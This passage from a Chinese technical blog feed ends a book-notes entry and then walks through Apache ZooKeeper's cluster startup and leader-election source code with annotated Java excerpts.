<h3 id="第六课-美味奥秘——美拉德反应"><a href="#第六课-美味奥秘——美拉德反应" class="headerlink" title="第六课 美味奥秘——美拉德反应"></a>第六课 美味奥秘——美拉德反应</h3><p>135 厨房噩梦<br>136 烹饪中的化学<br>137 多情的原子<br>138 人体内的催化剂——酶<br>139 能干的酶<br>140 美味奥秘——美拉德反应<br>142 味蕾的语言很妙<br>143 味道与气味的奇妙碰撞<br>144 让人眼馋的焦黄色<br>145 蛋糕制作中的化学原理<br>147 用科学实验增添生活趣味<br>150 科学的蛋糕烘焙技巧<br>152 烘焙里的科学原理<br>154 我的健康饮食法<br>156 美食大挑战</p>
<h3 id="第七章-气候变迁"><a href="#第七章-气候变迁" class="headerlink" title="第七章 气候变迁"></a>第七章 气候变迁</h3><p>159 难以忽视的气候问题<br>160 冰河世纪<br>161 气候变迁并不恐怖<br>162 四季变幻如此美妙<br>164 温室效应元凶<br>166 地球表面温度变化<br>169 泰晤士河上的冰上集市<br>171 中世纪温暖时期和小冰期<br>173 时冷时热的太阳<br>174 聊聊太阳黑子<br>175 太阳上也有气候<br>178 星期三的火山灰<br>179 火山爆发气候变冷<br>180 地球越来越热<br>180 发现喷射气流<br>181 平流层航空飞行<br>182 热平衡世界<br>184 蝴蝶效应<br>184 鸟瞰地球天气系统<br>185 地球上的大气循环<br>186 厄尼尔诺现象<br>187 给你介绍一个气候模型<br>189 别怕，应对气候变化是我们的专长</p>
<h3 id="第八课-探索外星文明"><a href="#第八课-探索外星文明" class="headerlink" title="第八课 探索外星文明"></a>第八课 探索外星文明</h3><p>191 外星人在太空等你<br>193 送你上太空<br>194 站在巨人的肩膀上<br>196 运动并不需要受力<br>197 加速则需要力<br>199 力，总是成对出现的<br>199 物体之间相互吸引<br>200 科学真的没那么高精尖<br>203 火箭侠<br>204 登月的证明<br>207 与月球亲密接触<br>208 用面包屑做成的房子<br>211 寻找可能性<br>212 寻找外星智慧<br>213 如何计算外星人的数量<br>216 E.T.不给任何人打电话<br>217 外星人都到哪儿去了？<br>扩展阅读 /219</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1></blockquote>
<p>都是借助上下班时间在地铁上看的,算是复习了一下初高中地理、物理知识.看到牛顿、爱因斯坦等还是如此的熟悉又陌生.个人对未知的世界比较感兴趣,对恐龙时代也比较感兴趣.惊讶于一个10公里的陨石让白垩纪时期的恐龙灭绝。对地外文明充满好奇,到底有没有外星人？长什么样子？看完有一些收获。竟然有具体的公式来计算宇宙中宜居星球的数量,惊叹于大自然的神奇,惊叹于科学的力量。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper源码分析三之server集群启动过程</title>
    <url>/2019/04/14/distributed/zookeeper%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%89%E4%B9%8Bserver%E9%9B%86%E7%BE%A4%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>前面大概说了一下单机的启动过程,本文主要来说一下 zookeeper 集群的启动过程。</p>
<a id="more"></a>
<p>当配置的 server 大于 0 的时候启用集群方式启动</p>
<h1 id="QuorumPeerMain-的-runFromConfig-方法"><a href="#QuorumPeerMain-的-runFromConfig-方法" class="headerlink" title="QuorumPeerMain 的 runFromConfig 方法"></a>QuorumPeerMain 的 runFromConfig 方法</h1><p>zookeeper 集群启动的逻辑都在这个方法里边实现，下边咱们一步步向下走.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runFromConfig</span><span class="params">(QuorumPeerConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 注册log4j JMX</span></span><br><span class="line">          ManagedUtil.registerLog4jMBeans();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (JMException e) &#123;</span><br><span class="line">          LOG.warn(<span class="string">"Unable to register log4j JMX control"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      LOG.info(<span class="string">"Starting quorum peer"</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//创建连接工厂</span></span><br><span class="line">          ServerCnxnFactory cnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">          <span class="comment">//启动NIO Server</span></span><br><span class="line">          cnxnFactory.configure(config.getClientPortAddress(),</span><br><span class="line">                                config.getMaxClientCnxns());</span><br><span class="line">          <span class="comment">// 创建并初始化QuorumPeer</span></span><br><span class="line">          quorumPeer = getQuorumPeer();</span><br><span class="line">          <span class="comment">//servers</span></span><br><span class="line">          quorumPeer.setQuorumPeers(config.getServers());</span><br><span class="line">          <span class="comment">//设置事务日志文件</span></span><br><span class="line">          quorumPeer.setTxnFactory(<span class="keyword">new</span> FileTxnSnapLog(</span><br><span class="line">                  <span class="keyword">new</span> File(config.getDataLogDir()),</span><br><span class="line">                  <span class="keyword">new</span> File(config.getDataDir())));</span><br><span class="line">          <span class="comment">// 选举类型</span></span><br><span class="line">          quorumPeer.setElectionType(config.getElectionAlg());</span><br><span class="line">          quorumPeer.setMyid(config.getServerId());</span><br><span class="line">          quorumPeer.setTickTime(config.getTickTime());</span><br><span class="line">          quorumPeer.setInitLimit(config.getInitLimit());</span><br><span class="line">          quorumPeer.setSyncLimit(config.getSyncLimit());</span><br><span class="line">          quorumPeer.setQuorumListenOnAllIPs(config.getQuorumListenOnAllIPs());</span><br><span class="line">          <span class="comment">// 设置连接信息</span></span><br><span class="line">          quorumPeer.setCnxnFactory(cnxnFactory);</span><br><span class="line">          quorumPeer.setQuorumVerifier(config.getQuorumVerifier());</span><br><span class="line">          quorumPeer.setClientPortAddress(config.getClientPortAddress());</span><br><span class="line">          quorumPeer.setMinSessionTimeout(config.getMinSessionTimeout());</span><br><span class="line">          quorumPeer.setMaxSessionTimeout(config.getMaxSessionTimeout());</span><br><span class="line">          <span class="comment">// 设置内存数据</span></span><br><span class="line">          quorumPeer.setZKDatabase(<span class="keyword">new</span> ZKDatabase(quorumPeer.getTxnFactory()));</span><br><span class="line">          <span class="comment">// 学习者类型</span></span><br><span class="line">          quorumPeer.setLearnerType(config.getPeerType());</span><br><span class="line">          quorumPeer.setSyncEnabled(config.getSyncEnabled());</span><br><span class="line"></span><br><span class="line">          <span class="comment">// sets quorum sasl authentication configurations</span></span><br><span class="line">          quorumPeer.setQuorumSaslEnabled(config.quorumEnableSasl);</span><br><span class="line">          <span class="keyword">if</span>(quorumPeer.isQuorumSaslAuthEnabled())&#123;</span><br><span class="line">              quorumPeer.setQuorumServerSaslRequired(config.quorumServerRequireSasl);</span><br><span class="line">              quorumPeer.setQuorumLearnerSaslRequired(config.quorumLearnerRequireSasl);</span><br><span class="line">              quorumPeer.setQuorumServicePrincipal(config.quorumServicePrincipal);</span><br><span class="line">              quorumPeer.setQuorumServerLoginContext(config.quorumServerLoginContext);</span><br><span class="line">              quorumPeer.setQuorumLearnerLoginContext(config.quorumLearnerLoginContext);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          quorumPeer.setQuorumCnxnThreadsSize(config.quorumCnxnThreadsSize);</span><br><span class="line">          <span class="comment">// 初始化QuorumPeer</span></span><br><span class="line">          quorumPeer.initialize();</span><br><span class="line">          <span class="comment">//启动QuorumPeer</span></span><br><span class="line">          quorumPeer.start();</span><br><span class="line">          quorumPeer.join();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">          <span class="comment">// warn, but generally this is ok</span></span><br><span class="line">          LOG.warn(<span class="string">"Quorum Peer interrupted"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>主要是初始化集群的配置信息,下边主要看 start 方法.</p>
<h1 id="QuorumPeer-的-start-方法"><a href="#QuorumPeer-的-start-方法" class="headerlink" title="QuorumPeer 的 start 方法"></a>QuorumPeer 的 start 方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载db</span></span><br><span class="line">    loadDataBase();</span><br><span class="line">    <span class="comment">//启动server,接收请求</span></span><br><span class="line">    cnxnFactory.start();</span><br><span class="line">    <span class="comment">//开始leader选举</span></span><br><span class="line">    startLeaderElection();</span><br><span class="line">    <span class="comment">//启动当前线程</span></span><br><span class="line">    <span class="keyword">super</span>.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个同步方法主要是加载 db 到内存,启动 server,接收请求,开始 leader 选取。<br>下边一步一步看主要的逻辑.</p>
<h2 id="QuorumPeer-的-loadDataBase-方法"><a href="#QuorumPeer-的-loadDataBase-方法" class="headerlink" title="QuorumPeer 的 loadDataBase 方法"></a>QuorumPeer 的 loadDataBase 方法</h2><p>加载节点、日志信息到内存中.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadDataBase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个临时的更新文件updatingEpoch</span></span><br><span class="line">        File updating = <span class="keyword">new</span> File(getTxnFactory().getSnapDir(),</span><br><span class="line">                                 UPDATING_EPOCH_FILENAME);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从磁盘加载日志文件到内存</span></span><br><span class="line">            zkDb.loadDataBase();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// load the epochs 获取最后处理的zxid</span></span><br><span class="line">            <span class="keyword">long</span> lastProcessedZxid = zkDb.getDataTree().lastProcessedZxid;</span><br><span class="line">            <span class="comment">// 根据最后的zxid右移32位生成新的zxid</span></span><br><span class="line">    		<span class="keyword">long</span> epochOfZxid = ZxidUtils.getEpochFromZxid(lastProcessedZxid);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//从日志文件读取当前epoch</span></span><br><span class="line">            	currentEpoch = readLongFromFile(CURRENT_EPOCH_FILENAME);</span><br><span class="line">                <span class="comment">// 如果新生成的zxid大于当前zxid则设置为当前epoch</span></span><br><span class="line">                <span class="keyword">if</span> (epochOfZxid &gt; currentEpoch &amp;&amp; updating.exists()) &#123;</span><br><span class="line">                    LOG.info(<span class="string">"&#123;&#125; found. The server was terminated after "</span> +</span><br><span class="line">                             <span class="string">"taking a snapshot but before updating current "</span> +</span><br><span class="line">                             <span class="string">"epoch. Setting current epoch to &#123;&#125;."</span>,</span><br><span class="line">                             UPDATING_EPOCH_FILENAME, epochOfZxid);</span><br><span class="line">                    <span class="comment">//设置为当前epoch,并写回到updatingEpoch文件中</span></span><br><span class="line">                    setCurrentEpoch(epochOfZxid);</span><br><span class="line">                    <span class="keyword">if</span> (!updating.delete()) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to delete "</span> +</span><br><span class="line">                                              updating.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(FileNotFoundException e) &#123;</span><br><span class="line">            	<span class="comment">// pick a reasonable epoch number</span></span><br><span class="line">            	<span class="comment">// this should only happen once when moving to a</span></span><br><span class="line">            	<span class="comment">// new code version</span></span><br><span class="line">            	currentEpoch = epochOfZxid;</span><br><span class="line">            	LOG.info(CURRENT_EPOCH_FILENAME</span><br><span class="line">            	        + <span class="string">" not found! Creating with a reasonable default of &#123;&#125;. This should only happen when you are upgrading your installation"</span>,</span><br><span class="line">            	        currentEpoch);</span><br><span class="line">            	writeLongToFile(CURRENT_EPOCH_FILENAME, currentEpoch);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果生成的epoch大于当前epoch则抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (epochOfZxid &gt; currentEpoch) &#123;</span><br><span class="line">            	<span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"The current epoch, "</span> + ZxidUtils.zxidToString(currentEpoch) + <span class="string">", is older than the last zxid, "</span> + lastProcessedZxid);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 从接受文件中读取待接受的epoch</span></span><br><span class="line">            	acceptedEpoch = readLongFromFile(ACCEPTED_EPOCH_FILENAME);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(FileNotFoundException e) &#123;</span><br><span class="line">            	<span class="comment">// pick a reasonable epoch number</span></span><br><span class="line">            	<span class="comment">// this should only happen once when moving to a</span></span><br><span class="line">            	<span class="comment">// new code version</span></span><br><span class="line">            	acceptedEpoch = epochOfZxid;</span><br><span class="line">            	LOG.info(ACCEPTED_EPOCH_FILENAME</span><br><span class="line">            	        + <span class="string">" not found! Creating with a reasonable default of &#123;&#125;. This should only happen when you are upgrading your installation"</span>,</span><br><span class="line">            	        acceptedEpoch);</span><br><span class="line">                <span class="comment">//回写当前epoch到文件中</span></span><br><span class="line">            	writeLongToFile(ACCEPTED_EPOCH_FILENAME, acceptedEpoch);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (acceptedEpoch &lt; currentEpoch) &#123;</span><br><span class="line">            	<span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"The accepted epoch, "</span> + ZxidUtils.zxidToString(acceptedEpoch) + <span class="string">" is less than the current epoch, "</span> + ZxidUtils.zxidToString(currentEpoch));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IOException ie) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Unable to load database on disk"</span>, ie);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Unable to run quorum server "</span>, ie);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>主要是获取最后的 zxid,并生成最新的 zxid 写入到文件中。</p>
<h2 id="NIOServerCnxnFactory-的-start-方法"><a href="#NIOServerCnxnFactory-的-start-方法" class="headerlink" title="NIOServerCnxnFactory 的 start 方法"></a>NIOServerCnxnFactory 的 start 方法</h2><p>这个方法也是启动当前线程，处理连接请求信息。和单机的一样,这里不详细说了。</p>
<h2 id="QuorumPeer-的-startLeaderElection-的方法"><a href="#QuorumPeer-的-startLeaderElection-的方法" class="headerlink" title="QuorumPeer 的 startLeaderElection 的方法"></a>QuorumPeer 的 startLeaderElection 的方法</h2><p>leader 选取的核心方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startLeaderElection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//将myid,当前epoch封装为投票信息</span></span><br><span class="line">    		currentVote = <span class="keyword">new</span> Vote(myid, getLastLoggedZxid(), getCurrentEpoch());</span><br><span class="line">    	&#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">    		RuntimeException re = <span class="keyword">new</span> RuntimeException(e.getMessage());</span><br><span class="line">    		re.setStackTrace(e.getStackTrace());</span><br><span class="line">    		<span class="keyword">throw</span> re;</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="comment">//设置当前server的地址信息</span></span><br><span class="line">        <span class="keyword">for</span> (QuorumServer p : getView().values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.id == myid) &#123;</span><br><span class="line">                myQuorumAddr = p.addr;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找不到地址信息,抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (myQuorumAddr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"My id "</span> + myid + <span class="string">" not in the peer list"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//选举类型为0</span></span><br><span class="line">        <span class="keyword">if</span> (electionType == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//初始化socket</span></span><br><span class="line">                udpSocket = <span class="keyword">new</span> DatagramSocket(myQuorumAddr.getPort());</span><br><span class="line">                <span class="comment">//启动相应线程开始投票</span></span><br><span class="line">                responder = <span class="keyword">new</span> ResponderThread();</span><br><span class="line">                responder.start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建选举算法</span></span><br><span class="line">        <span class="keyword">this</span>.electionAlg = createElectionAlgorithm(electionType);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ResponderThread-的-run-方法"><a href="#ResponderThread-的-run-方法" class="headerlink" title="ResponderThread 的 run 方法"></a>ResponderThread 的 run 方法</h3><p>投票响应线程,响应当前 server id 和 zxid。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResponderThread</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">        ResponderThread() &#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="string">"ResponderThread"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">byte</span> b[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">36</span>];</span><br><span class="line">                ByteBuffer responseBuffer = ByteBuffer.wrap(b);</span><br><span class="line">                <span class="comment">//数据报信息</span></span><br><span class="line">                DatagramPacket packet = <span class="keyword">new</span> DatagramPacket(b, b.length);</span><br><span class="line">                <span class="keyword">while</span> (running) &#123;</span><br><span class="line">                    <span class="comment">//dup接收消息</span></span><br><span class="line">                    udpSocket.receive(packet);</span><br><span class="line">                    <span class="keyword">if</span> (packet.getLength() != <span class="number">4</span>) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Got more than just an xid! Len = "</span></span><br><span class="line">                                + packet.getLength());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        responseBuffer.clear();</span><br><span class="line">                        responseBuffer.getInt(); <span class="comment">// Skip the xid</span></span><br><span class="line">                        responseBuffer.putLong(myid);</span><br><span class="line">                        <span class="comment">//获取当前投票信息</span></span><br><span class="line">                        Vote current = getCurrentVote();</span><br><span class="line">                        <span class="comment">//server状态</span></span><br><span class="line">                        <span class="keyword">switch</span> (getPeerState()) &#123;</span><br><span class="line">                        <span class="comment">//仍在选举leader</span></span><br><span class="line">                        <span class="keyword">case</span> LOOKING:</span><br><span class="line">                            responseBuffer.putLong(current.getId());</span><br><span class="line">                            responseBuffer.putLong(current.getZxid());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="comment">//当前为leader</span></span><br><span class="line">                        <span class="keyword">case</span> LEADING:</span><br><span class="line">                            responseBuffer.putLong(myid);</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">long</span> proposed;</span><br><span class="line">                                <span class="keyword">synchronized</span>(leader) &#123;</span><br><span class="line">                                    proposed = leader.lastProposed;</span><br><span class="line">                                &#125;</span><br><span class="line">                                responseBuffer.putLong(proposed);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (NullPointerException npe) &#123;</span><br><span class="line">                                <span class="comment">// This can happen in state transitions,</span></span><br><span class="line">                                <span class="comment">// just ignore the request</span></span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="comment">//当前为follower</span></span><br><span class="line">                        <span class="keyword">case</span> FOLLOWING:</span><br><span class="line">                            responseBuffer.putLong(current.getId());</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                responseBuffer.putLong(follower.getZxid());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (NullPointerException npe) &#123;</span><br><span class="line">                                <span class="comment">// This can happen in state transitions,</span></span><br><span class="line">                                <span class="comment">// just ignore the request</span></span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="comment">// observer不参与投票</span></span><br><span class="line">                        <span class="keyword">case</span> OBSERVING:</span><br><span class="line">                            <span class="comment">// Do nothing, Observers keep themselves to</span></span><br><span class="line">                            <span class="comment">// themselves.</span></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        packet.setData(b);</span><br><span class="line">                        <span class="comment">//发送数据报</span></span><br><span class="line">                        udpSocket.send(packet);</span><br><span class="line">                    &#125;</span><br><span class="line">                    packet.setLength(b.length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Unexpected runtime exception in ResponderThread"</span>,e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Unexpected IO exception in ResponderThread"</span>,e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                LOG.warn(<span class="string">"QuorumPeer responder thread exited"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="QuorumPeer-的-createElectionAlgorithm-的方法"><a href="#QuorumPeer-的-createElectionAlgorithm-的方法" class="headerlink" title="QuorumPeer 的 createElectionAlgorithm 的方法"></a>QuorumPeer 的 createElectionAlgorithm 的方法</h3><p>根据选举类型创建选举算法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Election <span class="title">createElectionAlgorithm</span><span class="params">(<span class="keyword">int</span> electionAlgorithm)</span></span>&#123;</span><br><span class="line">        Election le=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//<span class="doctag">TODO:</span> use a factory rather than a switch</span></span><br><span class="line">        <span class="keyword">switch</span> (electionAlgorithm) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            le = <span class="keyword">new</span> LeaderElection(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            le = <span class="keyword">new</span> AuthFastLeaderElection(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            le = <span class="keyword">new</span> AuthFastLeaderElection(<span class="keyword">this</span>, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            qcm = createCnxnManager();</span><br><span class="line">            QuorumCnxManager.Listener listener = qcm.listener;</span><br><span class="line">            <span class="keyword">if</span>(listener != <span class="keyword">null</span>)&#123;</span><br><span class="line">                listener.start();</span><br><span class="line">                le = <span class="keyword">new</span> FastLeaderElection(<span class="keyword">this</span>, qcm);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.error(<span class="string">"Null listener when initializing cnx manager"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> le;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>系统默认的选举算法为 FastLeaderElection。下边主要看这一部分方法的实现。</p>
<h4 id="QuorumCnxManager-Listener"><a href="#QuorumCnxManager-Listener" class="headerlink" title="QuorumCnxManager.Listener"></a>QuorumCnxManager.Listener</h4><p>快速 leader 选举算法实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建leader选举的TCP连接管理</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> QuorumCnxManager <span class="title">createCnxnManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> QuorumCnxManager(<span class="keyword">this</span>.getId(),</span><br><span class="line">                                    <span class="keyword">this</span>.getView(),</span><br><span class="line">                                    <span class="keyword">this</span>.authServer,</span><br><span class="line">                                    <span class="keyword">this</span>.authLearner,</span><br><span class="line">                                    <span class="keyword">this</span>.tickTime * <span class="keyword">this</span>.syncLimit,</span><br><span class="line">                                    <span class="keyword">this</span>.getQuorumListenOnAllIPs(),</span><br><span class="line">                                    <span class="keyword">this</span>.quorumCnxnThreadsSize,</span><br><span class="line">                                    <span class="keyword">this</span>.isQuorumSaslAuthEnabled());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// visible for testing</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">QuorumCnxManager</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> mySid,</span></span></span><br><span class="line"><span class="function"><span class="params">                            Map&lt;Long,QuorumPeer.QuorumServer&gt; view,</span></span></span><br><span class="line"><span class="function"><span class="params">                            QuorumAuthServer authServer,</span></span></span><br><span class="line"><span class="function"><span class="params">                            QuorumAuthLearner authLearner,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">int</span> socketTimeout,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">boolean</span> listenOnAllIPs,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">int</span> quorumCnxnThreadsSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">boolean</span> quorumSaslAuthEnabled,</span></span></span><br><span class="line"><span class="function"><span class="params">                            ConcurrentHashMap&lt;Long, SendWorker&gt; senderWorkerMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.senderWorkerMap = senderWorkerMap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.recvQueue = <span class="keyword">new</span> ArrayBlockingQueue&lt;Message&gt;(RECV_CAPACITY);</span><br><span class="line">        <span class="keyword">this</span>.queueSendMap = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ArrayBlockingQueue&lt;ByteBuffer&gt;&gt;();</span><br><span class="line">        <span class="keyword">this</span>.lastMessageSent = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ByteBuffer&gt;();</span><br><span class="line">        String cnxToValue = System.getProperty(<span class="string">"zookeeper.cnxTimeout"</span>);</span><br><span class="line">        <span class="keyword">if</span>(cnxToValue != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.cnxTO = Integer.parseInt(cnxToValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.mySid = mySid;</span><br><span class="line">        <span class="keyword">this</span>.socketTimeout = socketTimeout;</span><br><span class="line">        <span class="keyword">this</span>.view = view;</span><br><span class="line">        <span class="keyword">this</span>.listenOnAllIPs = listenOnAllIPs;</span><br><span class="line"></span><br><span class="line">        initializeAuth(mySid, authServer, authLearner, quorumCnxnThreadsSize,</span><br><span class="line">                quorumSaslAuthEnabled);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//启动listener线程，等待连接请求</span></span><br><span class="line">        listener = <span class="keyword">new</span> Listener();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化认证</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initializeAuth</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> mySid,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">final</span> QuorumAuthServer authServer,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">final</span> QuorumAuthLearner authLearner,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">final</span> <span class="keyword">int</span> quorumCnxnThreadsSize,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">final</span> <span class="keyword">boolean</span> quorumSaslAuthEnabled)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.authServer = authServer;</span><br><span class="line">        <span class="keyword">this</span>.authLearner = authLearner;</span><br><span class="line">        <span class="keyword">this</span>.quorumSaslAuthEnabled = quorumSaslAuthEnabled;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.quorumSaslAuthEnabled) &#123;</span><br><span class="line">            LOG.debug(<span class="string">"Not initializing connection executor as quorum sasl auth is disabled"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init connection executors</span></span><br><span class="line">        <span class="keyword">final</span> AtomicInteger threadIndex = <span class="keyword">new</span> 